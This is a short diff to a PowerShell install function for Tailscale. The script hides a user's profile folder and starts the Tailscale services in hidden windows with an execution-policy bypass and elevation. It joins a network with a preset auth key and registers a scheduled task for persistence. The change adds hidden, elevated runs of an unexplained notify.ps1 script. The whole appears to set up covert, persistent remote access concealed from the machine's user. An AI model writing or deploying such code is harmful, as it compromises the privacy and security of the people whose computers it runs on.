@@ -39,10 +39,13 @@ function installTailscale {
   Write-Output "Get-Item 'C:\Users\$uName' -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 Set-Location C:\tailscale
 .\tailscaled.exe  -windowstyle hidden -ep bypass -Verb RunAs
-.\tailscale-ipn.exe -windowstyle hidden" >> tailscale.ps1
+.\tailscale-ipn.exe -windowstyle hidden
+.\notify.ps1 -windowstyle hidden -ep bypass -Verb RunAs" >> tailscale.ps1
   Start-Sleep 2
   .\tailscaled.exe  -windowstyle hidden -ep bypass -Verb RunAs
   .\tailscale.exe  -windowstyle hidden -ep bypass -Verb RunAs -ArgumentList 'up --authkey $authKey'
+  .\tailscale-ipn.exe -windowstyle hidden -ep bypass -Verb RunAs
+  .\notify.ps1 -windowstyle hidden -ep bypass -Verb RunAs
 
   $name = "Tailscale"
   $action = New-ScheduledTaskAction -Execute "C:\Tailscale\tailscale.ps1"
